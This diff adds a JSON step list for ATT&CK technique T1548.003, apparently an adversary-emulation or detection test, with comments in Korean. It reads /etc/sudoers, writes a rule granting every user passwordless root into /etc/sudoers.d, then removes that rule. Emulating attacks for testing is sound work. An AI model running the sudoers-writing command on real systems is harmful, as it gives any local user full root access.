@@ -1,0 +1,21 @@
+{
+  "technique_id": "T1548.003",
+  "goal": "sudo 설정을 고쳐 비밀번호 없이 권한을 얻는다",
+  "steps": [
+    {
+      "order": 1,
+      "purpose": "sudoers 확인",
+      "command": "cat /etc/sudoers 2>/dev/null || true"
+    },
+    {
+      "order": 2,
+      "purpose": "sudoers.d 에 규칙 추가 시도",
+      "command": "mkdir -p /etc/sudoers.d && echo 'ALL ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/pbpf-canary 2>/dev/null || true"
+    },
+    {
+      "order": 3,
+      "purpose": "정리",
+      "command": "rm -f /etc/sudoers.d/pbpf-canary"
+    }
+  ]
+}
